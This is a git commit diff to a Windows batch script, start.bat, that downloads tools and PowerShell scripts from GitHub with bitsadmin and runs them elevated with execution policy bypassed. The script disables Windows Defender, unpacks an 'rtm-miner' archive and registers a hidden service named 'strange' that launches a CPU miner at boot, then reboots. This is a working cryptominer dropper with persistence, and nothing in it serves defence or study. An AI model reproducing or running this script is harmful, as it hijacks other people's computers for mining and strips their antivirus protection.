8bb6b895df386cfcc271812a731c83ffd3035bf8
xcgx <36234354+xcgx@users.noreply.github.com>
2021-11-25 05:30:24 +0800

    Update start.bat

--- start.bat
+++ start.bat
@@ -8,17 +8,17 @@ call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://ra
 call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/strange/main/srvany.exe %appdata%\srvany.exe
 call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/master/scripts/disable-windows-defender.ps1 %appdata%\disable-windows-defender.ps1
 call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/blob/master/scripts/optimize-windows-update.ps1 %appdata%\doptimize-windows-update.ps1
-call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/master/scripts/UninstallMicrosoftTeams.ps1 %appdata%\UninstallMicrosoftTeams.ps1.ps1
+call bitsadmin.exe /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/xcgx/Debloat-Windows-10/master/scripts/UninstallMicrosoftTeams.ps1 %appdata%\UninstallMicrosoftTeams.ps1
 :::::::::: 净化系统 :::::::::
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\disable-windows-defender.ps1""' -Verb RunAs}"
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\doptimize-windows-update.ps1""' -Verb RunAs}"
-call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\UninstallMicrosoftTeams.ps1.ps1""' -Verb RunAs}"
+call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\UninstallMicrosoftTeams.ps1""' -Verb RunAs}"
 :::::::::: 执行任务 :::::::::
 call PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%appdata%\prevent-screen-lock.ps1""' -Verb RunAs}"
 cd %appdata%
 start "%appdata%\7z.exe" x "%appdata%\rtm-miner.zip"
 :::::::::: 自启 :::::::::
+cd %appdata%
 call instsrv strange "%appdata%\srvany.exe"
 call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\rtm-miner\cpuminer.bat" /f 
-call reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\strange\Parameters\ /v Application /t REG_SZ /d "%appdata%\prevent-screen-lock.ps1" /f 
-reboot
+shutdown -r -t 5
